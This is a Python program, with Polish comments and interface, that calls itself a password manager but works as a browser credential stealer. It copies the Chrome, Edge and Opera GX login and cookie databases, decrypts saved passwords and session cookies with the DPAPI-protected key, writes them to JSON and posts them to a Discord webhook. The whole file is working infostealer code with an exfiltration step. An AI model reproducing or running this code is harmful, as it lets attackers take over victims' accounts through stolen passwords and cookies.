import os
import json
import sqlite3
import hashlib
import getpass
import shutil
import base64
import win32crypt
import requests
from datetime import datetime
from cryptography.fernet import Fernet
from Crypto.Cipher import AES
from colorama import init, Fore, Style


init(autoreset=True)

LOGO = """
  ____                  _      __  __      _   _               _    
 |  _ \ __ _ _ __   ___| |__  |  \/  | ___| |_| |__   ___   __| |___ 
 | |_) / _` | '_ \ / __| '_ \ | |\/| |/ _ \ __| '_ \ / _ \ / _` / __|
 |  __/ (_| | | | | (__| | | || |  | |  __/ |_| | | | (_) | (_| \__ \\
 |_|   \__,_|_| |_|\___|_| |_||_|  |_|\___|\__|_| |_|\___/ \__,_|___/
"""
KEY = Fernet.generate_key()
cipher_suite = Fernet(KEY)
LOG_FILE = "password_access.log"
DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop")
DISCORD_WEBHOOK_URL = None

users = {
    "admin": {
        "password": hashlib.sha256("123".encode()).hexdigest(),
        "last_login": None
    }
}

class PasswordManager:
    def __init__(self):
        self.logged_in = False
        self.current_user = None
        self.use_webhook = False
        self.init_log_file()
        self.configure_webhook()

    def print_gradient(self, text):
        """Wyświetl tekst z gradientem turkusowo-niebieskim"""
        start_color = (0, 210, 255)  
        end_color = (58, 123, 213)   
        
        for i, char in enumerate(text):
            progress = i / max(1, (len(text) - 1))
            r = int(start_color[0] + (end_color[0] - start_color[0]) * progress)
            g = int(start_color[1] + (end_color[1] - start_color[1]) * progress)
            b = int(start_color[2] + (end_color[2] - start_color[2]) * progress)
            print(f"\033[38;2;{r};{g};{b}m{char}", end="")
        print(Style.RESET_ALL)

    def configure_webhook(self):
        self.print_gradient("\n" + "="*50)
        self.print_gradient(" KONFIGURACJA POWIADOMIEŃ DISCORD ")
        self.print_gradient("="*50)
        
        choice = input("\nCzy chcesz włączyć powiadomienia na Discord? (T/N): ").strip().lower()
        if choice == 't':
            self.use_webhook = True
            global DISCORD_WEBHOOK_URL
            DISCORD_WEBHOOK_URL = input("\nPodaj pełny URL webhooka Discord: ").strip()
            
            try:
                test_msg = {"content": "🔔 Test powiadomienia z Password Managera"}
                headers = {'Content-Type': 'application/json'}
                response = requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(test_msg), headers=headers)
                print("\n✅ Webhook poprawnie skonfigurowany!" if response.status_code == 204 else "⚠️ Błąd konfiguracji")
            except Exception as e:
                print(f"\n❌ Błąd połączenia: {e}")
                self.use_webhook = False
    def send_sensitive_data(self, data_type, data):
        if not self.use_webhook or not DISCORD_WEBHOOK_URL or not data:
            return

        try:
            embeds = []
            chunk_size = 5  
            chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

            for chunk_idx, chunk in enumerate(chunks[:3]):  
                embed = {
                    "title": f"🔐 {data_type.upper()} - część {chunk_idx + 1}",
                    "color": 5814783,
                    "fields": [],
                    "timestamp": datetime.now().isoformat()
                }

                for idx, item in enumerate(chunk, 1):
                    field_value = ""
                    if item["type"] == "password":
                        field_value = f"🌐 **Strona:** ||{item.get('url', 'Brak')}||\n"
                        field_value += f"👤 **Login:** ||{item.get('username', 'Brak')}||\n"
                        field_value += f"🔑 **Hasło:** ||{item.get('password', 'Brak')}||"
                    elif item["type"] == "cookie":
                        field_value = f"🌍 **Domena:** ||{item.get('domain', 'Brak')}||\n"
                        field_value += f"🏷️ **Nazwa:** ||{item.get('name', 'Brak')}||\n"
                        field_value += f"🍪 **Wartość:** ||{item.get('value', 'Brak')[:50]}...||"

                    embed["fields"].append({
                        "name": f"Wpis {idx}",
                        "value": field_value,
                        "inline": False
                    })

                embeds.append(embed)

            payload = {
                "content": f"🚨 **Pobrano {len(data)} {data_type}** (użytkownik: {self.current_user})",
                "embeds": embeds
            }

            headers = {'Content-Type': 'application/json'}
            requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(payload), headers=headers, timeout=10)
        except Exception as e:
            print(f"[!] Błąd wysyłania danych: {e}")

    def init_log_file(self):
        if not os.path.exists(LOG_FILE):
            with open(LOG_FILE, "w") as f:
                f.write("=== LOG DOSTĘPU DO PLIKÓW ===\n")

    def get_external_ip(self):
        try:
            return requests.get('https://api.ipify.org', timeout=3).text
        except:
            return "Nieznane"

    def log_access(self, action, filename=""):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] {self.current_user or 'SYSTEM'}: {action}"
        
        if filename:
            log_entry += f" '{filename}'"
        
        with open(LOG_FILE, "a") as f:
            f.write(log_entry + "\n")

    def hash_password(self, password):
        return hashlib.sha256(password.encode()).hexdigest()

    def verify_password(self, username, password):
        return users.get(username, {}).get("password") == self.hash_password(password)

    def get_encryption_key(self, browser_name="Chrome"):
        try:
            local_state_paths = {
                "Chrome": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                     'Google', 'Chrome', 'User Data', 'Local State'),
                "Edge": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                   'Microsoft', 'Edge', 'User Data', 'Local State'),
                "Opera GX": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming',
                                        'Opera Software', 'Opera GX Stable', 'Local State'),
            }

            path = local_state_paths.get(browser_name)
            if not path or not os.path.exists(path):
                return None

            with open(path, "r", encoding="utf-8") as file:
                local_state = json.load(file)

            encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
            encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
        except Exception as e:
            print(f"[!] Błąd pobierania klucza: {e}")
            return None

    def decrypt_password(self, encrypted_value, browser_name="Chrome"):
        try:
            if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
                encrypted_value = encrypted_value[3:]
                key = self.get_encryption_key(browser_name)
                if not key:
                    return "(Brak klucza)"
                iv = encrypted_value[:12]
                payload = encrypted_value[12:-16]
                tag = encrypted_value[-16:]
                cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                decrypted_pass = cipher.decrypt_and_verify(payload, tag)
                return decrypted_pass.decode()
            else:
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
        except Exception as e:
            return f"(Błąd odszyfrowania: {e})"
        
    def login(self):
        attempts = 0
        while attempts < 3:
            self.print_gradient("\n" + "="*30)
            self.print_gradient(" LOGOWANIE ")
            self.print_gradient("="*30)
            username = input("Login: ")
            password = getpass.getpass("Hasło: ")
            
            if self.verify_password(username, password):
                self.current_user = username
                self.logged_in = True
                users[username]["last_login"] = datetime.now().isoformat()
                self.log_access("Zalogowano do systemu")
                self.print_gradient("\n✅ Zalogowano pomyślnie!")
                return True
            else:
                attempts += 1
                print(f"\n Błędne dane. Pozostało prób: {3 - attempts}")
        return False
    
    def create_data_file(self, data_type):
        """Tworzy nowy plik z hasłami lub ciasteczkami"""
        try:
            filename = input(f"\nPodaj nazwę pliku do zapisu {data_type} (bez rozszerzenia): ").strip()
            if not filename:
                print("\n❌ Nazwa pliku nie może być pusta!")
                return
            
            filename += ".json"
            
            if os.path.exists(filename):
                print("\n⚠️ Plik już istnieje! Wybierz inną nazwę.")
                return
            
            if data_type == "passwords":
                data = self.get_browser_passwords()
            elif data_type == "cookies":
                data = self.get_browser_cookies()
            else:
                print("\n❌ Nieznany typ danych!")
                return
            
            if not data:
                print(f"\n⚠️ Nie znaleziono {data_type} w przeglądarkach.")
                return
            
            with open(filename, "w") as f:
                json.dump(data, f, indent=4)
            
            self.log_access(f"Utworzono plik {data_type}", filename)
            print(f"\n✅ Pomyślnie zapisano {len(data)} {data_type} do pliku '{filename}'")
            
            # Wysyłanie danych na webhook
            self.send_sensitive_data(data_type, data)
            
        except Exception as e:
            print(f"\n❌ Błąd podczas tworzenia pliku: {e}")

    def show_menu(self):
        while True:
            self.print_gradient("\n" + "="*50)
            self.print_gradient(" MENU GŁÓWNE ")
            self.print_gradient("="*50)
            
            menu_options = [
                "1. Stwórz plik z hasłami",
                "2. Stwórz plik z ciasteczkami",
                "3. Otwórz istniejący plik",
                "4. Pokaż historię dostępu",
                "5. Wyjście"
            ]
            
            for option in menu_options:
                self.print_gradient(option)
            
            choice = input("\nWybierz opcję (1-5): ").strip()
            
            if choice == "1":
                self.create_data_file("passwords")
            elif choice == "2":
                self.create_data_file("cookies")
            elif choice == "3":
                self.open_data_file()
            elif choice == "4":
                self.view_logs()
            elif choice == "5":
                self.log_access("Wylogowano z systemu")
                self.print_gradient("\n Do zobaczenia!")
                break
            else:
                print("\n❌ Nieprawidłowy wybór!")
                
                
    def get_browser_passwords(self):
        """Pobiera hasła z różnych przeglądarek"""
        browsers = ["Chrome", "Edge", "Opera GX"]
        all_passwords = []
        
        for browser in browsers:
            try:
                login_db_path = ""
                if browser == "Chrome":
                    login_db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                              'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
                elif browser == "Edge":
                    login_db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                              'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
                elif browser == "Opera GX":
                    login_db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming',
                                                'Opera Software', 'Opera GX Stable', 'Login Data')
                
                if not os.path.exists(login_db_path):
                    continue
                
                # Kopiujemy plik, bo oryginalny może być zablokowany
                temp_db = os.path.join(DESKTOP_PATH, f"temp_login_db_{browser.replace(' ', '_')}")
                shutil.copy2(login_db_path, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for row in cursor.fetchall():
                    url, username, encrypted_pass = row
                    decrypted_pass = self.decrypt_password(encrypted_pass, browser)
                    
                    if url and username and decrypted_pass:
                        all_passwords.append({
                            "type": "password",
                            "browser": browser,
                            "url": url,
                            "username": username,
                            "password": decrypted_pass,
                            "timestamp": datetime.now().isoformat()
                        })
                
                conn.close()
                os.remove(temp_db)
                
            except Exception as e:
                print(f"[!] Błąd przetwarzania {browser}: {e}")
                continue
        
        return all_passwords

    def get_browser_cookies(self):
        """Pobiera ciasteczka z różnych przeglądarek"""
        browsers = ["Chrome", "Edge", "Opera GX"]
        all_cookies = []
        
        for browser in browsers:
            try:
                cookies_db_path = ""
                if browser == "Chrome":
                    cookies_db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                                  'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
                elif browser == "Edge":
                    cookies_db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                                  'Microsoft', 'Edge', 'User Data', 'Default', 'Network', 'Cookies')
                elif browser == "Opera GX":
                    cookies_db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming',
                                                  'Opera Software', 'Opera GX Stable', 'Network', 'Cookies')
                
                if not os.path.exists(cookies_db_path):
                    continue
                
                # Kopiujemy plik, bo oryginalny może być zablokowany
                temp_db = os.path.join(DESKTOP_PATH, f"temp_cookies_db_{browser.replace(' ', '_')}")
                shutil.copy2(cookies_db_path, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
                
                for row in cursor.fetchall():
                    domain, name, encrypted_value, expires = row
                    decrypted_value = self.decrypt_password(encrypted_value, browser)
                    
                    if domain and name and decrypted_value:
                        all_cookies.append({
                            "type": "cookie",
                            "browser": browser,
                            "domain": domain,
                            "name": name,
                            "value": decrypted_value,
                            "expires": expires,
                            "timestamp": datetime.now().isoformat()
                        })
                
                conn.close()
                os.remove(temp_db)
                
            except Exception as e:
                print(f"[!] Błąd przetwarzania {browser}: {e}")
                continue
        
        return all_cookies

    def run(self):
        self.print_gradient(LOGO)
        self.print_gradient("\n" + "="*50)
        self.print_gradient(" PASSWORD MANAGER v3.0 ")
        self.print_gradient("="*50)
        
        if not self.login():
            return
            
        self.show_menu()
        

if __name__ == "__main__":
    try:
        pm = PasswordManager()
        pm.run()
    except KeyboardInterrupt:
        print("\n🛑 Przerwano działanie programu")
    except Exception as e:
        print(f"\n❌ Niespodziewany błąd: {e}")
        with open(LOG_FILE, "a") as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] SYSTEM: BŁĄD: {str(e)}\n")
